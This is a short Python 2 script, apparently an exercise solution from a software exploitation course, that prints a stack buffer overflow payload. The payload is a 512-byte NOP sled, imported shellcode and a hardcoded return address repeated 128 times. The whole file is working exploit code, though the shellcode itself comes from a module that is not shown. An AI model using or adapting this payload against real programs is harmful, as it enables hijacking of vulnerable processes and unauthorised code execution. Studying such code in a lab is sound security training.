#!/usr/bin/python

from shellcode import shellcode
from struct import pack

if __name__ == '__main__':
    print "\x90"*512 + shellcode + "\x80" + pack("<I", 0xBFFEF1f0)*128
